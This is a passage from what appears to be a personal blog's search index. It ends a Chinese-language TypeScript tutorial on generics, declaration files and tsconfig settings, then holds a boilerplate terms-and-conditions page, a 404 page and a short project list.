   <span class="keyword">return</span> b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> longerArray = <span class="title function_">longest</span>([<span class="number">1</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">const</span> longerString = <span class="title function_">longest</span>(<span class="string">&quot;alice&quot;</span>, <span class="string">&quot;bob&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(longerArray, longerString); <span class="comment">// [ 1, 2, 3 ] alice</span></span><br><span class="line"><span class="keyword">const</span> notOK = <span class="title function_">longest</span>(<span class="number">10</span>, <span class="number">100</span>); <span class="comment">// error TS2345</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsgenericfunction-4"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> combine&lt;<span class="title class_">Type</span>&gt;(<span class="attr">arr1</span>: <span class="title class_">Type</span>[], <span class="attr">arr2</span>: <span class="title class_">Type</span>[]): <span class="title class_">Type</span>[] &#123;</span><br><span class="line">  <span class="keyword">return</span> arr1.<span class="title function_">concat</span>(arr2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr = combine&lt;<span class="built_in">string</span> | <span class="built_in">number</span>&gt;([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="string">&quot;hello&quot;</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr); <span class="comment">// [ 1, 2, 3, &#x27;hello&#x27; ]</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><ul>
<li>TS和ES6标准一样，文件中出现<code>import</code>或<code>export</code>语句时，此文件即为module，反之文件作用域是global的。</li>
</ul>
<h1 id="声明文件"><a href="#声明文件" class="headerlink" title="声明文件"></a>声明文件</h1><p>声明文件（Declaration File, “.d.ts”）用于为JavaScript编写的API提供TypeScript类型信息。例如jquery.js为JS库，可以新增一个jquery.d.ts文件，里面以TS语法声明用到的API，在index.ts中调用jquery时可以享受到TS语法的支持，如同jquery本身是TS实现的一样。</p>
<div class="tabs" id="tsdeclarationfile"><ul class="nav-tabs"><li class="tab active"><a href="#tsdeclarationfile-1">util.js</a></li><li class="tab"><a href="#tsdeclarationfile-2">util.d.ts</a></li><li class="tab"><a href="#tsdeclarationfile-3">index.ts</a></li></ul><div class="tab-content"><div class="tab-pane active" id="tsdeclarationfile-1"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GlobalVariable</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PI</span> = <span class="number">3.1415926</span>;</span><br><span class="line"><span class="keyword">let</span> id = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GlobalFunction</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params">g</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> g == <span class="string">&#x27;object&#x27;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;g.color&#125;</span> - <span class="subst">$&#123;g.greeting&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(g);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Object</span></span><br><span class="line"><span class="keyword">const</span> greetObj = &#123;</span><br><span class="line">    <span class="title function_">log</span>(<span class="params">opt</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">verbose</span> = opt.<span class="property">verbose</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">makeGreeting</span>: <span class="keyword">function</span> (<span class="params">s</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">verbose</span>)</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">numberOfGreetings</span>++;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`[<span class="subst">$&#123;s&#125;</span>]`</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">verbose</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">numberOfGreetings</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Class</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Greeter</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">greeting</span>) &#123; <span class="variable language_">this</span>.<span class="property">greeting</span> = greeting; &#125;</span><br><span class="line">    <span class="title function_">showGreeting</span>(<span class="params"></span>) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">greeting</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123; <span class="variable constant_">PI</span>, id, greet, <span class="title class_">Greeter</span>, greetObj &#125;;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsdeclarationfile-2"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GlobalVariable</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">declare</span> <span class="keyword">const</span> <span class="attr">PI</span>: <span class="built_in">number</span>;</span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">let</span> <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GlobalFunction</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">GreetingSetting</span> &#123;</span><br><span class="line">  <span class="attr">greeting</span>: <span class="built_in">string</span>;</span><br><span class="line">  color?: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">GreetingLike</span> = <span class="built_in">string</span> | <span class="title class_">GreetingSetting</span>;</span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params">g: GreetingLike</span>): <span class="built_in">void</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Object</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">namespace</span> greetObj &#123;</span><br><span class="line">    <span class="keyword">interface</span> <span class="title class_">LogOption</span> &#123;</span><br><span class="line">        <span class="attr">verbose</span>: <span class="built_in">boolean</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">log</span>(<span class="params">opt: LogOption</span>): <span class="built_in">void</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">makeGreeting</span>(<span class="params">s: <span class="built_in">string</span></span>): <span class="built_in">string</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">verbose</span>: <span class="built_in">boolean</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">numberOfGreetings</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Class</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">class</span> <span class="title class_">Greeter</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">greeting: <span class="built_in">string</span></span>);</span><br><span class="line">    <span class="attr">greeting</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="title function_">showGreeting</span>(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsdeclarationfile-3"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="variable constant_">PI</span>, id, greet, <span class="title class_">Greeter</span>, greetObj &#125; <span class="keyword">from</span> <span class="string">&quot;./util&quot;</span>; <span class="comment">// (no extension)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// GlobalVariable</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable constant_">PI</span>); <span class="comment">// 3.1415926 (util.js)</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">TypeOfPI</span> = <span class="keyword">typeof</span> <span class="variable constant_">PI</span>; <span class="comment">// number (util.d.ts)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(id); <span class="comment">// 100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// GlobalFunction</span></span><br><span class="line"><span class="title function_">greet</span>(<span class="string">&quot;Hi!&quot;</span>); <span class="comment">// Hi!</span></span><br><span class="line"><span class="title function_">greet</span>(&#123;<span class="attr">greeting</span>: <span class="string">&quot;GS&quot;</span>, <span class="attr">color</span>: <span class="string">&quot;red&quot;</span>&#125;); <span class="comment">// red - GS</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Object</span></span><br><span class="line"><span class="keyword">let</span> result1 = greetObj.<span class="title function_">makeGreeting</span>(<span class="string">&quot;MG1&quot;</span>);</span><br><span class="line">greetObj.<span class="title function_">log</span>(&#123; <span class="attr">verbose</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="keyword">let</span> result2 = greetObj.<span class="title function_">makeGreeting</span>(<span class="string">&quot;MG2&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> count = greetObj.<span class="property">numberOfGreetings</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result1, result2, count); <span class="comment">// [MG1] [MG2] 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Class</span></span><br><span class="line"><span class="keyword">const</span> g = <span class="keyword">new</span> <span class="title class_">Greeter</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">g.<span class="title function_">showGreeting</span>(); <span class="comment">// A</span></span><br><span class="line">g.<span class="property">greeting</span> = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">g.<span class="title function_">showGreeting</span>(); <span class="comment">// B</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SpecialGreeter</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Greeter</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>(<span class="string">&quot;SG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> sg = <span class="keyword">new</span> <span class="title class_">SpecialGreeter</span>();</span><br><span class="line">sg.<span class="title function_">showGreeting</span>(); <span class="comment">// SG</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="导入库"><a href="#导入库" class="headerlink" title="导入库"></a>导入库</h2><ul>
<li>两种导入依赖方式：<ul>
<li>reference注释：适用于出现global库时</li>
<li>import语句：支持module</li>
</ul>
</li>
</ul>
<div class="tabs" id="tsconsumedependencies"><ul class="nav-tabs"><li class="tab active"><a href="#tsconsumedependencies-1">reference</a></li><li class="tab"><a href="#tsconsumedependencies-2">import</a></li></ul><div class="tab-content"><div class="tab-pane active" id="tsconsumedependencies-1"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// when your library depends on global library</span></span><br><span class="line"><span class="comment">/// &lt;reference types=&quot;someLib&quot; /&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getThing</span>(<span class="params"></span>): someLib.<span class="property">thing</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// when global library depends on a UMD module</span></span><br><span class="line"><span class="comment">/// &lt;reference types=&quot;moment&quot; /&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getThing</span>(<span class="params"></span>): moment;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsconsumedependencies-2"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// your library depends on a module</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> moment <span class="keyword">from</span> <span class="string">&quot;moment&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getThing</span>(<span class="params"></span>): moment;</span><br><span class="line"></span><br><span class="line"><span class="comment">// when your module or UMD library depends on a UMD library</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> someLib <span class="keyword">from</span> <span class="string">&quot;someLib&quot;</span>;</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="编译器"><a href="#编译器" class="headerlink" title="编译器"></a>编译器</h1><p><a href="https://www.typescriptlang.org/docs/handbook/compiler-options.html">tsc CLI Options</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g typescript</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>tsc</strong> 将ts代码转换为js</p>
<ul>
<li>noImplicitAny 用error代替隐式any类型</li>
<li>strictNullChecks 使用值之前必须确保它不是<code>null</code>或<code>undefined</code></li>
<li><code>-p, --project</code> 指定项目root目录（tsconfig.json文件所在的目录）</li>
</ul>
</li>
<li><p>为js自动生成d.ts文件（js -&gt; d.ts）：<br><code>npx -p typescript tsc src/**/*.js --declaration --allowJs --emitDeclarationOnly --outDir types</code></p>
</li>
</ul>
<h1 id="项目管理"><a href="#项目管理" class="headerlink" title="项目管理"></a>项目管理</h1><h2 id="npm配置"><a href="#npm配置" class="headerlink" title="npm配置"></a>npm配置</h2><ul>
<li>package.json：通过<code>&quot;types&quot;: &quot;main.d.ts&quot;</code>指定js依赖的ts文件位置</li>
</ul>
<div class="tabs" id="tsnpmconfigjson"><ul class="nav-tabs"><li class="tab active"><a href="#tsnpmconfigjson-1">tsconfig.json</a></li></ul><div class="tab-content"><div class="tab-pane active" id="tsnpmconfigjson-1"><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;awesome&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Vandelay Industries&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./lib/main.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;types&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./lib/main.d.ts&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="tsc配置"><a href="#tsc配置" class="headerlink" title="tsc配置"></a>tsc配置</h2><p><a href="https://www.typescriptlang.org/tsconfig">Intro to the TSConfig Reference</a><br><a href="https://github.com/tsconfig/bases/">Centralized Recommendations for TSConfig bases</a></p>
<ul>
<li>tsconfig.json或jsconfig.json：标识所在目录为TypeScript项目root目录</li>
</ul>
<div class="tabs" id="tsconfigjson"><ul class="nav-tabs"><li class="tab active"><a href="#tsconfigjson-1">tsconfig.json</a></li><li class="tab"><a href="#tsconfigjson-2">js -> d.ts</a></li></ul><div class="tab-content"><div class="tab-pane active" id="tsconfigjson-1"><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;extends&quot;</span><span class="punctuation">:</span> <span class="string">&quot;@tsconfig/node12/tsconfig.json&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;commonjs&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;noImplicitAny&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;removeComments&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;preserveConstEnums&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;sourceMap&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;outFile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;built/tsc.js&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;files&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;core.ts&quot;</span><span class="punctuation">,</span> <span class="string">&quot;util.ts&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;include&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;src/**/*&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exclude&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;node_modules&quot;</span><span class="punctuation">,</span> <span class="string">&quot;**/*.spec.ts&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsconfigjson-2"><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;include&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;src/**/*&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// Tells TypeScript to read JS files, as normally they are ignored as source files</span></span><br><span class="line">    <span class="attr">&quot;allowJs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// Generate d.ts files</span></span><br><span class="line">    <span class="attr">&quot;declaration&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// This compiler run should only output d.ts files</span></span><br><span class="line">    <span class="attr">&quot;emitDeclarationOnly&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// Types should go into this directory.</span></span><br><span class="line">    <span class="comment">// Removing this would place the .d.ts files next to the .js files</span></span><br><span class="line">    <span class="attr">&quot;outDir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dist&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// go to js file when using IDE functions like &quot;Go to Definition&quot; in VSCode</span></span><br><span class="line">    <span class="attr">&quot;declarationMap&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://www.typescriptlang.org/docs/handbook/intro.html">The TypeScript Handbook</a><br>[2] <a href="https://www.typescriptlang.org/docs/handbook/jsdoc-supported-types.html">JSDoc Reference</a></p>
]]></content>
      <categories>
        <category>ProgrammingLanguage</category>
        <category>TypeScript</category>
      </categories>
      <tags>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/tos.html</url>
    <content><![CDATA[<h1>Terms and Conditions</h1>
<p>Last updated: February 25, 2021</p>
<p>Please read these terms and conditions carefully before using Our Service.</p>
<h1>Interpretation and Definitions</h1>
<h2>Interpretation</h2>
<p>The words of which the initial letter is capitalized have meanings defined under the following conditions. The following definitions shall have the same meaning regardless of whether they appear in singular or in plural.</p>
<h2>Definitions</h2>
<p>For the purposes of these Terms and Conditions:</p>
<ul>
<li>
<p><strong>Affiliate</strong> means an entity that controls, is controlled by or is under common control with a party, where &quot;control&quot; means ownership of 50% or more of the shares, equity interest or other securities entitled to vote for election of directors or other managing authority.</p>
</li>
<li>
<p><strong>Country</strong> refers to: California,  United States</p>
</li>
<li>
<p><strong>Company</strong> (referred to as either &quot;the Company&quot;, &quot;We&quot;, &quot;Us&quot; or &quot;Our&quot; in this Agreement) refers to Just Do It.</p>
</li>
<li>
<p><strong>Device</strong> means any device that can access the Service such as a computer, a cellphone or a digital tablet.</p>
</li>
<li>
<p><strong>Service</strong> refers to the Website.</p>
</li>
<li>
<p><strong>Terms and Conditions</strong> (also referred as &quot;Terms&quot;) mean these Terms and Conditions that form the entire agreement between You and the Company regarding the use of the Service. This Terms and Conditions agreement has been created with the help of the <a href="https://www.termsfeed.com/terms-conditions-generator/" target="_blank">Terms and Conditions Generator</a>.</p>
</li>
<li>
<p><strong>Third-party Social Media Service</strong> means any services or content (including data, information, products or services) provided by a third-party that may be displayed, included or made available by the Service.</p>
</li>
<li>
<p><strong>Website</strong> refers to Just Do It, accessible from <a href="https://blog.imssyang.com" rel="external nofollow noopener" target="_blank">https://blog.imssyang.com</a></p>
</li>
<li>
<p><strong>You</strong> means the individual accessing or using the Service, or the company, or other legal entity on behalf of which such individual is accessing or using the Service, as applicable.</p>
</li>
</ul>
<h1>Acknowledgment</h1>
<p>These are the Terms and Conditions governing the use of this Service and the agreement that operates between You and the Company. These Terms and Conditions set out the rights and obligations of all users regarding the use of the Service.</p>
<p>Your access to and use of the Service is conditioned on Your acceptance of and compliance with these Terms and Conditions. These Terms and Conditions apply to all visitors, users and others who access or use the Service.</p>
<p>By accessing or using the Service You agree to be bound by these Terms and Conditions. If You disagree with any part of these Terms and Conditions then You may not access the Service.</p>
<p>You represent that you are over the age of 18. The Company does not permit those under 18 to use the Service.</p>
<p>Your access to and use of the Service is also conditioned on Your acceptance of and compliance with the Privacy Policy of the Company. Our Privacy Policy describes Our policies and procedures on the collection, use and disclosure of Your personal information when You use the Application or the Website and tells You about Your privacy rights and how the law protects You. Please read Our Privacy Policy carefully before using Our Service.</p>
<h1>Links to Other Websites</h1>
<p>Our Service may contain links to third-party web sites or services that are not owned or controlled by the Company.</p>
<p>The Company has no control over, and assumes no responsibility for, the content, privacy policies, or practices of any third party web sites or services. You further acknowledge and agree that the Company shall not be responsible or liable, directly or indirectly, for any damage or loss caused or alleged to be caused by or in connection with the use of or reliance on any such content, goods or services available on or through any such web sites or services.</p>
<p>We strongly advise You to read the terms and conditions and privacy policies of any third-party web sites or services that You visit.</p>
<h1>Termination</h1>
<p>We may terminate or suspend Your access immediately, without prior notice or liability, for any reason whatsoever, including without limitation if You breach these Terms and Conditions.</p>
<p>Upon termination, Your right to use the Service will cease immediately.</p>
<h1>Limitation of Liability</h1>
<p>Notwithstanding any damages that You might incur, the entire liability of the Company and any of its suppliers under any provision of this Terms and Your exclusive remedy for all of the foregoing shall be limited to the amount actually paid by You through the Service or 100 USD if You haven't purchased anything through the Service.</p>
<p>To the maximum extent permitted by applicable law, in no event shall the Company or its suppliers be liable for any special, incidental, indirect, or consequential damages whatsoever (including, but not limited to, damages for loss of profits, loss of data or other information, for business interruption, for personal injury, loss of privacy arising out of or in any way related to the use of or inability to use the Service, third-party software and/or third-party hardware used with the Service, or otherwise in connection with any provision of this Terms), even if the Company or any supplier has been advised of the possibility of such damages and even if the remedy fails of its essential purpose.</p>
<p>Some states do not allow the exclusion of implied warranties or limitation of liability for incidental or consequential damages, which means that some of the above limitations may not apply. In these states, each party's liability will be limited to the greatest extent permitted by law.</p>
<h1>&quot;AS IS&quot; and &quot;AS AVAILABLE&quot; Disclaimer</h1>
<p>The Service is provided to You &quot;AS IS&quot; and &quot;AS AVAILABLE&quot; and with all faults and defects without warranty of any kind. To the maximum extent permitted under applicable law, the Company, on its own behalf and on behalf of its Affiliates and its and their respective licensors and service providers, expressly disclaims all warranties, whether express, implied, statutory or otherwise, with respect to the Service, including all implied warranties of merchantability, fitness for a particular purpose, title and non-infringement, and warranties that may arise out of course of dealing, course of performance, usage or trade practice. Without limitation to the foregoing, the Company provides no warranty or undertaking, and makes no representation of any kind that the Service will meet Your requirements, achieve any intended results, be compatible or work with any other software, applications, systems or services, operate without interruption, meet any performance or reliability standards or be error free or that any errors or defects can or will be corrected.</p>
<p>Without limiting the foregoing, neither the Company nor any of the company's provider makes any representation or warranty of any kind, express or implied: (i) as to the operation or availability of the Service, or the information, content, and materials or products included thereon; (ii) that the Service will be uninterrupted or error-free; (iii) as to the accuracy, reliability, or currency of any information or content provided through the Service; or (iv) that the Service, its servers, the content, or e-mails sent from or on behalf of the Company are free of viruses, scripts, trojan horses, worms, malware, timebombs or other harmful components.</p>
<p>Some jurisdictions do not allow the exclusion of certain types of warranties or limitations on applicable statutory rights of a consumer, so some or all of the above exclusions and limitations may not apply to You. But in such a case the exclusions and limitations set forth in this section shall be applied to the greatest extent enforceable under applicable law.</p>
<h1>Governing Law</h1>
<p>The laws of the Country, excluding its conflicts of law rules, shall govern this Terms and Your use of the Service. Your use of the Application may also be subject to other local, state, national, or international laws.</p>
<h1>Disputes Resolution</h1>
<p>If You have any concern or dispute about the Service, You agree to first try to resolve the dispute informally by contacting the Company.</p>
<h1>For European Union (EU) Users</h1>
<p>If You are a European Union consumer, you will benefit from any mandatory provisions of the law of the country in which you are resident in.</p>
<h1>United States Legal Compliance</h1>
<p>You represent and warrant that (i) You are not located in a country that is subject to the United States government embargo, or that has been designated by the United States government as a &quot;terrorist supporting&quot; country, and (ii) You are not listed on any United States government list of prohibited or restricted parties.</p>
<h1>Severability and Waiver</h1>
<h2>Severability</h2>
<p>If any provision of these Terms is held to be unenforceable or invalid, such provision will be changed and interpreted to accomplish the objectives of such provision to the greatest extent possible under applicable law and the remaining provisions will continue in full force and effect.</p>
<h2>Waiver</h2>
<p>Except as provided herein, the failure to exercise a right or to require performance of an obligation under this Terms shall not effect a party's ability to exercise such right or require such performance at any time thereafter nor shall be the waiver of a breach constitute a waiver of any subsequent breach.</p>
<h1>Translation Interpretation</h1>
<p>These Terms and Conditions may have been translated if We have made them available to You on our Service.
You agree that the original English text shall prevail in the case of a dispute.</p>
<h1>Changes to These Terms and Conditions</h1>
<p>We reserve the right, at Our sole discretion, to modify or replace these Terms at any time. If a revision is material We will make reasonable efforts to provide at least 30 days' notice prior to any new terms taking effect. What constitutes a material change will be determined at Our sole discretion.</p>
<p>By continuing to access or use Our Service after those revisions become effective, You agree to be bound by the revised terms. If You do not agree to the new terms, in whole or in part, please stop using the website and the Service.</p>
<h1>Contact Us</h1>
<p>If you have any questions about these Terms and Conditions, You can contact us:</p>
<ul>
<li>By visiting this page on our website: <a href="https://blog.imssyang.com/contact" rel="external nofollow noopener" target="_blank">https://blog.imssyang.com/contact</a></li>
</ul>

]]></content>
  </entry>
  <entry>
    <title>404</title>
    <url>/404/index.html</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">██╗  ██╗ ██████╗ ██╗  ██╗    ███╗   ██╗ ██████╗ ████████╗</span><br><span class="line">██║  ██║██╔═████╗██║  ██║    ████╗  ██║██╔═══██╗╚══██╔══╝</span><br><span class="line">███████║██║██╔██║███████║    ██╔██╗ ██║██║   ██║   ██║</span><br><span class="line">╚════██║████╔╝██║╚════██║    ██║╚██╗██║██║   ██║   ██║</span><br><span class="line">     ██║╚██████╔╝     ██║    ██║ ╚████║╚██████╔╝   ██║</span><br><span class="line">     ╚═╝ ╚═════╝      ╚═╝    ╚═╝  ╚═══╝ ╚═════╝    ╚═╝</span><br><span class="line"></span><br><span class="line">    ███████╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗</span><br><span class="line">    ██╔════╝██╔═══██╗██║   ██║████╗  ██║██╔══██╗</span><br><span class="line">    █████╗  ██║   ██║██║   ██║██╔██╗ ██║██║  ██║</span><br><span class="line">    ██╔══╝  ██║   ██║██║   ██║██║╚██╗██║██║  ██║</span><br><span class="line">    ██║     ╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝</span><br><span class="line">    ╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝</span><br></pre></td></tr></table></figure>
<!--
<script src="//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js"
        charset="utf-8" homePageUrl="/" homePageName="Back to home">
</script>
-->

]]></content>
  </entry>
  <entry>
    <title>Doing</title>
    <url>/about/index.html</url>
    <content><![CDATA[<ul>
<li><a href="gweb-nfz8.onrender.com">GWeb</a>: Requires 1min to start on <a href="https://render.com/">Render</a><ul>
<li><a href="https://github.com/imssyang/gweb">https://github.com/imssyang/gweb</a></li>
<li><a href="https://github.com/imssyang/formatui">https://github.com/imssyang/formatui</a></li>
</ul>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Categories</title>
    <url>/categories/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Tags</title>
    <url>/tags/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
